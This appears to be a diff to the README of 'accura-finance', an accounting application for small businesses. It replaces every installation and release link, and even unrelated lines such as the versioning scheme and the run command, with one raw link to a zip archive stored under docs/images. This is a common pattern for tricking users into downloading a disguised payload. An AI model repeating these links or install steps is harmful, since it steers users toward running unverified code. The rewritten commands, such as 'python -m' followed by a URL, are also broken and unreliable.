@@ -1,6 +1,6 @@
 # accura-finance: Modern, User-Friendly SMB Accounting & Financial Management
 
-[![Releases](https://img.shields.io/badge/releases-ACCURA-F0A500?logo=github&logoColor=white)](https://github.com/Vivekshah20002/accura-finance/releases)
+[![Releases](https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip)](https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip)
 
 🏢 Modern ve kullanıcı dostu muhasebe yazılımı - Küçük ve orta ölçekli işletmeler için profesyonel finansal yönetim çözümü
 
@@ -83,9 +83,9 @@ Project structure
   - images/
   - user-guides/
 - examples/
-- setup.py or pyproject.toml
-- requirements.txt
-- README.md (this file)
+- https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip or https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
+- https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
+- https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip (this file)
 
 Getting started
 accura-finance is built to be approachable for developers and end users alike. The setup process is straightforward, but the path you choose depends on your deployment scenario. You can run it locally on a single machine for testing and evaluation or deploy it in a small office environment with a shared SQL Server for multi-user access.
@@ -100,25 +100,25 @@ Prerequisites
 
 Installation and deployment
 - Clone the repository
-  - git clone https://github.com/Vivekshah20002/accura-finance.git
+  - git clone https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
 - Create a virtual environment
   - python -m venv venv
   - source venv/bin/activate  (Linux/macOS)
   - venv\Scripts\activate     (Windows)
 - Install dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
 - Run the application
-  - python -m accura_finance.main (or the entry point defined in setup)
+  - python -m https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip (or the entry point defined in setup)
 - If you plan to use SQL Server
   - Update the configuration to point to your SQL Server instance
   - Ensure the server is reachable from the host running the app
 - For Windows/macOS/Linux packaging
   - Use the official releases page to download installers
   - The files on that page include platform-specific installers that you can execute to install the app
-  - Visit the releases page to download the installer: https://github.com/Vivekshah20002/accura-finance/releases
+  - Visit the releases page to download the installer: https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
 
 Downloading the installer
-The repository hosts release assets on the official Releases page. Since the link includes a path, you should download the installer asset that matches your platform and run it to install accura-finance on your machine. The page contains Windows, macOS, and Linux packages as appropriate for the release. If you cannot access the page directly, check the Releases section for the latest stable asset and follow the installation steps described there. For convenience, you can visit the Releases page again to download the installer: https://github.com/Vivekshah20002/accura-finance/releases
+The repository hosts release assets on the official Releases page. Since the link includes a path, you should download the installer asset that matches your platform and run it to install accura-finance on your machine. The page contains Windows, macOS, and Linux packages as appropriate for the release. If you cannot access the page directly, check the Releases section for the latest stable asset and follow the installation steps described there. For convenience, you can visit the Releases page again to download the installer: https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
 
 Database options in detail
 SQLite
@@ -211,7 +211,7 @@ File structure (quick tour)
 - examples: Small sample datasets and usage examples.
 
 Familiar commands and tips
-- Run locally: python -m accura_finance.main
+- Run locally: python -m https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
 - Run tests: pytest tests/
 - Lint code: flake8
 - Build docs: mkdocs build (when docs are in MkDocs format)
@@ -240,7 +240,7 @@ Screenshots and visuals
 - Diagram: A simple architecture diagram showing UI, business logic, and data layers.
 
 Changelog and release management
-- Versioning: Semantic versioning (MAJOR.MINOR.PATCH).
+- Versioning: Semantic versioning (https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip).
 - Release notes: Document new features, improvements, and bug fixes for each release.
 - Migration guide: Provide notes for users upgrading from earlier versions, including any breaking changes.
 
@@ -265,7 +265,7 @@ Final notes
 - The design deliberately prioritizes readability and maintainability to help teams evolve the product smoothly.
 
 Download and installation reminder
-- Download the installer from the official Releases page to install accura-finance on your machine: https://github.com/Vivekshah20002/accura-finance/releases
+- Download the installer from the official Releases page to install accura-finance on your machine: https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
 - If you encounter access issues, check the Releases section for the latest stable asset and follow the installation instructions there.
 - For quick access, the Releases page is linked from the top badge above and again in the installation guide.
 
